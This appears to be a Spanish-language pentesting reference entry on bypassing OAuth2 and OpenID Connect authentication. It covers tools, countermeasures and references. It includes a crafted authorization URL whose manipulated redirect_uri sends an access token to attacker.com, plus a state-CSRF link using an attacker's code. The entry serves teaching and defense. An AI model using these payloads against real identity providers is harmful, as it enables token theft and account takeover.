---
title: Bypass de Autenticación en OAuth2 y OpenID
slug: explotacion-auth-bypass-oauth
aliases: [OAuth bypass, OpenID Connect bypass, OIDC bypass, OAuth2]
fase: [Explotación]
plataforma: Web
dificultad: Avanzada
mitre: [T1190]
related: [explotacion-jwt]
learning_refs: []
---

# Bypass de Autenticación en OAuth2 y OpenID

## Descripción
La explotación de fallos en OAuth2 y OpenID Connect (OIDC) ocurre cuando hay errores en la implementación de estos protocolos de autorización y autenticación delegada. Los atacantes aprovechan configuraciones incorrectas como redireccionamientos abiertos (Open Redirect), validación deficiente del `redirect_uri`, o la falta de uso del parámetro `state`. Esto permite el robo de tokens de acceso (`access_token`) o códigos de autorización, resultando en la suplantación de identidad del usuario en aplicaciones de terceros.

## Herramientas
- **Burp Suite** (OAuth Analysis) — para interceptar y manipular los flujos de autorización entre el cliente y el proveedor de identidad (IdP).
- **CyberChef** — para decodificar tokens JWT (`access_token` o `id_token`) y analizar sus claims.
- **ffuf** — para fuzzear parámetros de redirección y descubrir bypasses de listas blancas en `redirect_uri`.

## Comandos / Ejemplos

### Robo de Token vía Open Redirect
```text
# Petición de autorización manipulada
https://idp.com/auth?client_id=123&redirect_uri=https://client.com/callback%2f..%2f..%40attacker.com&response_type=token

# Si el IdP tiene una lista blanca débil, el token se enviará al atacante:
https://attacker.com/#access_token=ya29.A0AR...
```

### Bypass de validación de State
```text
# Si el parámetro 'state' no se valida o es predecible, se puede realizar CSRF en OAuth
# El atacante induce a la víctima a hacer clic en un enlace de autorización controlado
https://client.com/oauth/authorize?code=ATTACKER_CODE
# Esto vincula la cuenta del atacante con el perfil de la víctima
```

### Análisis de JWT (id_token)
```bash
# Decodificar el JWT para revisar si el 'alg' es 'none' o si el 'aud' es incorrecto
# Usar CyberChef o jwt.io para inspeccionar el payload
{
  "iss": "https://idp.com",
  "sub": "user_id_123",
  "aud": "my_client_id",
  "exp": 1715600000
}
```

## Contramedidas
- Implementar validación estricta (match exacto) de la `redirect_uri` en el servidor de autorización.
- Utilizar el parámetro `state` de forma obligatoria con valores aleatorios y no predecibles (anti-CSRF).
- Emplear PKCE (Proof Key for Code Exchange) para proteger el intercambio de códigos de autorización.
- Validar siempre la firma y los claims de los tokens JWT recibidos.

## Referencias
- Harper, A., Linn, R., Sims, S., & Baucom, M. (2018). *Gray Hat Hacking* (5th ed.). McGraw-Hill Education.
- MITRE Corporation. (2024). ATT&CK Technique T1190: Exploit Public-Facing Application. https://attack.mitre.org/techniques/T1190/
